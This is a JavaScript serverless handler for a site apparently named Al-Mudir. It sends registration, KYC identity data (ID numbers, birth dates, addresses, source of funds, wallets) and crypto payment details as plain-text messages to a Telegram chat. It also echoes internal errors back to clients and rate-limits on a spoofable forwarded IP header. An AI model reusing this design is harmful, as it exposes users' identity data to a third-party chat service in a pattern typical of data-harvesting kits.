// Simple in-memory rate limit: 5 requests per IP per 10 minutes
const rateLimitMap = new Map();
const RATE_WINDOW_MS = 10 * 60 * 1000;
const RATE_LIMIT = 5;

function checkRateLimit(ip) {
  const now = Date.now();
  const entry = rateLimitMap.get(ip) || { count: 0, reset: now + RATE_WINDOW_MS };
  if (now > entry.reset) {
    entry.count = 0;
    entry.reset = now + RATE_WINDOW_MS;
  }
  entry.count++;
  rateLimitMap.set(ip, entry);
  return entry.count <= RATE_LIMIT;
}

function sanitize(value, maxLen) {
  if (typeof value !== 'string') return 'N/A';
  // Strip control characters and limit length
  return value.replace(/[\x00-\x1F\x7F]/g, ' ').slice(0, maxLen).trim() || 'N/A';
}

function formatMessage(eventType, payload, ip) {
  if (eventType === 'user.created') {
    return [
      'NEW AL-MUDIR REGISTRATION',
      '--------------------------',
      'Name: ' + sanitize(payload.name, 100),
      'Email: ' + sanitize(payload.email, 200),
      'Message: ' + sanitize(payload.message, 500),
      'IP: ' + sanitize(ip, 80)
    ];
  }

  if (eventType === 'kyc.submitted') {
    return [
      'KYC SUBMISSION RECEIVED',
      '-----------------------',
      'Full Name: ' + sanitize(payload.full_name, 100),
      'Email: ' + sanitize(payload.email, 200),
      'Date of Birth: ' + sanitize(payload.date_of_birth, 50),
      'Country: ' + sanitize(payload.country, 80),
      'ID Type: ' + sanitize(payload.id_type, 50),
      'ID Number: ' + sanitize(payload.id_number, 80),
      'Residential Address: ' + sanitize(payload.residential_address, 200),
      'Source of Funds: ' + sanitize(payload.source_of_funds, 200),
      'Wallet Address: ' + sanitize(payload.wallet_address, 200),
      'Terms Accepted: ' + (payload.terms_accepted ? 'YES' : 'NO'),
      'IP: ' + sanitize(ip, 80)
    ];
  }

  if (eventType === 'free.access.requested') {
    return [
      'FREE ACCESS REQUEST',
      '-------------------',
      'Name: ' + sanitize(payload.name, 100),
      'Email: ' + sanitize(payload.email, 200),
      'Plan: ' + sanitize(payload.plan, 80),
      'IP: ' + sanitize(ip, 80)
    ];
  }

  if (eventType === 'crypto.payment.intent') {
    return [
      'CRYPTO PAYMENT INTENT',
      '---------------------',
      'Name: ' + sanitize(payload.name, 100),
      'Email: ' + sanitize(payload.email, 200),
      'Amount: ' + sanitize(payload.amount, 40),
      'Currency: ' + sanitize(payload.currency, 20),
      'Transaction Hash: ' + sanitize(payload.transaction_hash, 200),
      'IP: ' + sanitize(ip, 80)
    ];
  }

  return null;
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ ok: false, error: 'method_not_allowed' });
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || 'unknown';
  if (!checkRateLimit(ip)) {
    return res.status(429).json({ ok: false, error: 'rate_limit_exceeded' });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ ok: false, error: 'telegram_not_configured' });
  }

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body || {};
    const eventType = body.type || 'user.created';
    const payload = body.payload || {};

    const allowedEvents = new Set([
      'user.created',
      'kyc.submitted',
      'free.access.requested',
      'crypto.payment.intent'
    ]);

    if (!allowedEvents.has(eventType)) {
      return res.status(400).json({ ok: false, error: 'unsupported_event' });
    }

    const lines = formatMessage(eventType, payload, ip);
    if (!lines) {
      return res.status(400).json({ ok: false, error: 'invalid_payload' });
    }

    const telegramResponse = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: lines.join('\n')
      })
    });

    const telegramData = await telegramResponse.json();

    if (!telegramResponse.ok || !telegramData.ok) {
      return res.status(502).json({ ok: false, error: 'telegram_send_failed', details: telegramData });
    }

    return res.status(200).json({ ok: true, telegram: telegramData.result });
  } catch (error) {
    return res.status(500).json({ ok: false, error: 'server_error', message: error.message });
  }
};